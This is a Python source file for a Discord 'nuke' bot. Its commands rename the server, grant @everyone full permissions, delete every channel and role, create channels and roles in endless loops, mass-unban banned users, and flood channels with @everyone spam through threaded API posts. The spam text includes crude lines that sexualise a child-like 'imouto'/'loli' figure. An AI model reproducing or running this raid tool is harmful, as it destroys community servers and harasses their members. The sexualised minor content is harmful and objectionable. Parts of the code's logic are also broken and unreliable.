import discord
from discord.ext import commands, tasks
import os
import asyncio
import threading
import requests
import time
import json

rolespamnumber = 30 #the role number that the bot will attempt to create  
rolename = 'emiya shirou' # role name
servername = 'Archer' # the server name you desire 
channelname = 'Unlimited Blade Works'#channel name
prefix='initiate' # the prefix
intents=discord.Intents.default()
intents = discord.Intents(messages=True, guilds=True)
client = commands.Bot(command_prefix=prefix, intents=intents)
spammessage= """@everyone
I am the slam of my jam.

Slam is my body, and jam is my blood.

I have slammed over a thousand jams.

Unknown to slam.

Nor known to jam.

Withstood DMCA takedown notices to slam many jams.

Yet these slams will never jam anything.

So as I jam,

Unlimited Slam Works.

I am the imouto of my onii-chan

flat is my chest and smooth is my skin

I have hugged over a thousand onii-chans

unknown to purity, nor known to lewdness

have withstood pain to wear many pantsu

yet these little hips will never move on their own

so as I pray, Unlimited Loli Works

I am the Bone of my Skillet,

Steel is my Pan and Fire is my Oven,

I have cooked over a thousand meals,

Unknown to Fast Food, nor known to Instant Meals,

Have withstood heat to cook many dishes,

Yet this mouth will never eat anything,

So as I cook, Unlimited Food Works

I am the bone of my hand.

Ex is my body, and Fakku is my blood.

I have created over a thousand loads.

Unknown to sex.

Nor known to girls.

Have withstood pain to create many orgasms.

Yet, those orgasms will never be with girls.

So as I pray, Unlimited Hentai Works.
https://cdn.discordapp.com/attachments/907534472537317407/907538973847613440/b29.png"""


with open("b29.jpg", "rb") as f: #server's icon
    icon = f.read()

def spamming(channel):
  
    while(True):
        for i in range(50):
          try:
            channelID = channel.id
            botToken = str(os.getenv('TOKEN'))
            baseURL = "https://discordapp.com/api/v9/channels/{}/messages".format(channelID)
            headers = { "Authorization":"Bot {}".format(botToken),
                  "User-Agent":"myBotThing (http://some.url, v0.1)",
                  "Content-Type":"application/json", }
            

            message = spammessage
            POSTedJSON =  json.dumps ( {"content":message} )
            r = requests.post(baseURL, headers = headers, data = POSTedJSON)
          except:
            pass
            
@client.event
async def on_ready():
    print('ready')

@client.event 
async def on_guild_channel_create(channel):
  while(True):
    for i in range(5):
      await channel.send(spammessage)
  threading.Thread(target=spamming, args=(channel,)).start()
      


@client.command()
async def ping(ctx):
    await ctx.send(f'Pong! {round(client.latency * 1000)}ms') #latency check


@client.command()
async def thethirdimpact(ctx, *epic): #the nuke command, change it if you want
  
    print('the code was initiated, get ready for the nuke')
    if epic == "epic":
      await ctx.send("""`I am the Bone of my Sword
Steel is my Body and Fire is my Blood`""")
      time.sleep(1)
      await ctx.send("`I have created over a Thousand Blades`")
      time.sleep(1)
      await ctx.send("`Unknown to Death,`")
      time.sleep(1)
      await ctx.send("`Nor known to Life.`")
      time.sleep(1)
      await ctx.send("`Have withstood Pain to create many Weapons`")
      time.sleep(1)
      await ctx.send("`Yet those Hands will never hold Anything.`")
      time.sleep(1)
      await ctx.send("`So, as I Pray--`")
      time.sleep(2)
      await ctx.send("**Unlimited Blade Works**")
      time.sleep(2)
    elif epic == None:
      pass
    try:
      await ctx.guild.edit(name=servername, icon=icon) 
    except:
      print('no') 
    
    try:
        role = discord.utils.get(ctx.guild.roles, name="@everyone")
        await role.edit(permissions = discord.Permissions.all())
        print("ok")
    except:
        print("failed to change the permission")
    
    guild = ctx.message.guild
    
    for c in guild.channels:   
      try:
        await c.delete()
      except:
        print("cannot delete " + str(c))
        
    while(True):
      
      await guild.create_text_channel(channelname)
       #loop create the channels, the event function will do the job
    
@client.command()
async def spam(ctx):
  print('running spam')
  for channel in ctx.guild.channels:
    threading.Thread(target=spamming, args=(channel,)).start()



@client.command()
async def rolespam(ctx): #role spam command
  for rd in ctx.message.guild.roles:
      try:
        await rd.delete()
      except:
        print('cannot delete ' + str(rd))
  for r in range(rolespamnumber):
      try:
        await ctx.message.guild.create_role(name=rolename)
      except:
        print('max number of roles reached')
        break
@client.command()
async def massunban(ctx):
  bannedUsers = await ctx.message.guild.bans()
  for user in bannedUsers:
    await ctx.guild.unban(user.user)
    print('unbanned '+ user.user.name + '#' + user.user.discriminator)
@client.command()
async def createchannel(ctx):
  while(True):
          await ctx.message.guild.create_text_channel(channelname)
@client.command()
async def ban(ctx, member : discord.Member, *, reason = None):
  print('banning')
  if ctx.message.author.id == "464427494666272768":
    try:
      await member.ban()
      ctx.send('balls')
    except:
      print("cant ban")
  
client.run(os.getenv("TOKEN")) #login 
